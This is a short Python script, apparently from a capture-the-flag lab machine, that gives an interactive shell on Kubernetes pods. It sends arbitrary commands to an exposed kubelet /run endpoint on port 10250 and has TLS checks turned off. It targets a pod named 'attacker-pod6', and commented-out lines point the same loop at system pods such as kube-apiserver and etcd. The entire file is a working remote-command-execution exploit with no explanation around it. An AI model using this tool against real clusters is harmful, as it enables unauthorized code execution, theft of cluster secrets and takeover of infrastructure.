import readline
import requests

#URL = "https://10.129.230.82:10250/run/default/nginx/nginx"
URL = "https://10.129.230.82:10250/run/default/attacker-pod6/attacker-pod6"
#URL = "https://10.129.230.82:10250/run/kube-system/kube-proxy-g572l/kube-proxy"
#URL = "https://10.129.230.82:10250/run/kube-system/coredns-78fcd69978-p7b9b/coredns"
#URL = "https://10.129.230.82:10250/run/kube-system/storage-provisioner/storage-provisioner"
#URL = "https://10.129.230.82:10250/run/kube-system/kube-apiserver-steamcloud/kube-apiserver"
#URL = "https://10.129.230.82:10250/run/kube-system/kube-scheduler-steamcloud/kube-scheduler"
#URL = "https://10.129.230.82:10250/run/kube-system/kube-controller-manager-steamcloud/kube-controller-manager"
#URL = "https://10.129.230.82:10250/run/kube-system/etcd-steamcloud/etcd"

requests.packages.urllib3.disable_warnings()

while True:
    cmd = input("cmd: ")
    res = requests.post(URL, data={"cmd": cmd.strip()}, verify=False)
    print(res.text)
